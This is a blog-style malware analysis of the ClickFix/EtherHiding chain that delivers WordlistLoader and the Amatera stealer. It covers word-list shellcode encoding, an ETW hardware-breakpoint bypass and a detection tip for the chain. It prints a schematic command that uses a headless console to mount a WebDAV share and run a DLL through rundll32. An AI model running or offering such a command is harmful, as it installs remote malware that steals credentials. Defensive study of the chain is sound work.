+++
title = "WordlistLoader: Shellcode Hidden as Plain English Words"
date = "2026-08-24"
+++

# WordlistLoader: Shellcode Hidden as Plain English Words

The WordlistLoader analysis from August has the most novel encoding trick I've seen in a consumer-facing malware chain this year: the shellcode is stored as a sequence of plain English words, one word per byte. A lookup-table cipher where the ciphertext reads like grocery lists. AV parsers see words; the loader sees bytes. There's even a variant that swaps the wordlist for 16-byte UUID-encoded chunks, because one encoding scheme is a signature waiting to happen.

## The chain

Everything upstream is the ClickFix family, and the infrastructure layering is the part worth diagramming:

```text
compromised legit site (abogadosrosarinos[.]com, aptisweb[.]com, ...)
  └─ injected Base64 JS blob
      └─ fetches script from an ETHEREUM SMART CONTRACT   ← EtherHiding
          └─ dynamically executes retrieved code
              └─ ClickFix UI: fake "I'm not a robot" CAPTCHA
                  └─ "paste this into Win+R and press Enter"
                      └─ conhost → hidden cmd.exe → pushd WebDAV share
                          └─ rundll32.exe loads the loader
                              └─ WordlistLoader decodes word-list shellcode
                                  └─ reflective loader → Amatera 4.3.3-alpha1
```

Three layers of infrastructure laundering before a byte of payload: compromised sites, blockchain, and jsDelivr. The ClearFake operators moved primary hosting to `cdn.jsdelivr[.]net`, a legitimate CDN with no interest in scanning every npm/GitHub-sourced file it serves. Expel documented in January that jsDelivr pulls malicious repos fairly quickly, but it doesn't matter, because EtherHiding makes the first stage a shell game: burned URLs swap for fresh ones, cost of a gas fee. The blockchain layer is the resurrection stone for dead links.

The ClickFix command itself, from Microsoft's parallel WebDAV research, has three escalating variants, and WordlistLoader uses the fancy one:

```batch
:: advanced variant (WordlistLoader's flavor)
conhost.exe --headless cmd.exe /c
  <obfuscated env-var version of:>
  pushd \\webdav-share@SSL\path &
  rundll32.exe loader.dll,Entry
```

`conhost --headless` kills the visible console, environment-variable obfuscation plus delayed expansion hides `pushd`, `rundll32`, and the share host from eyeballs and static parsers, and the WebDAV mount means the DLL never lives on disk where a file scanner owns the timeline. Microsoft saw the same skeleton delivering ACR Stealer between April and June with Python loaders; WordlistLoader is the replacement part in the same machine.

## The ETW bypass

WordlistLoader patches ETW using a hardware-breakpoint method. The standard technique everyone implemented after the 2022 papers is `patch ETW's EtwEventWrite` with a `ret` at function entry; hardware-breakpoint variants set a debug register on the function prologue, and when the exception fires, the handler reroutes execution, leaving the code bytes untouched, so integrity checks that scan for the classic `0xC3` patch see a clean function. ETW is telemetry, not protection, and silencing it precedes everything else in the chain for a reason: the reflective loader and the syscall stunts downstream would otherwise narrate themselves to any EDR subscribed to the events.

## Amatera 4.3.3-alpha1

The payload ships with a version number that reads like a SaaS changelog, and the internals match: hardened syscall invocation through the WoW64 transition, dynamically generated x64 indirect-syscall trampolines invoked through Heaven's Gate (16-bit compatibility mode abuse, alive and well in 2026), and a redesigned Application-Bound Chrome encryption bypass credited as inspired by Remus Stealer. ABE bypass is the response to Google's app-bound cookie encryption, which was supposed to end the stealer era for Chrome cookies. The stealer era did not end. The bypass just got a release note.

## Conclusion

What strikes me about the whole chain is the division of labor. A compromised website does the trust, a blockchain does the persistence, a CDN does the bandwidth, Windows' own binaries do the execution, a wordlist does the encoding, and a fake CAPTCHA does the social engineering. Not one component is sophisticated alone. The composite is a machine where every defensive control has a designated counter-layer: blocklists→blockchain, file AV→in-memory, ETW→hardware breakpoints, user caution→CAPTCHA theater.

The detection anchor that still works, because it's the one thing the chain can't launder: ` rundll32.exe loading from a WebDAV UNC path` is a process/network behavior, not a file signature. Sysmon event 15 or any ESEN-equivalent catching `rundll32` with a `\\` path in the command line fires on all three WebDAV variants regardless of obfuscation. That, plus the boring human layer: nobody running a business has a legitimate reason to paste an admin command to solve a CAPTCHA. "I'm not a robot" that requires running code makes you exactly the robot.
